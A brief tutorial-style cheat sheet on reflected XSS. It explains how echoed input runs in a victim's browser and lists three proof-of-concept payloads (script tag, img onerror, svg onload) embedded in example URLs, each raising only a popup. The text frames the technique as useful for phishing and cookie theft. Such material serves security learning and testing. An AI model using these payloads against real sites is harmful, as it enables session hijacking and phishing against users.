Reflected XSS
Reflected XSS happens when your payload gets echoed right back
in the response without being stored.

it only runs when the victim clicks a special link
with your payload already inside the URL.

Reflected XSS is useful for phishing, stealing cookies,
or quick popups but not persistent as stored is.

Example Payloads:
<script>alert('xss')</script>
"><img src=x onerror=alert('reflected')>
"><svg/onload=confirm(999)>

Example URLs:
https://example.com/search?q=<script>alert('xss')</script>
https://example.com/profile?name="><img src=x onerror=alert('reflected')>
https://example.com/view?item="><svg/onload=confirm(999)>

What They Do:

First one runs a popup instantly when injected into a reflected spot like a search box.

Second one uses a broken image to trigger a popup with onerror event.

Third one uses a fake SVG that fires onload and shows a confirm box.
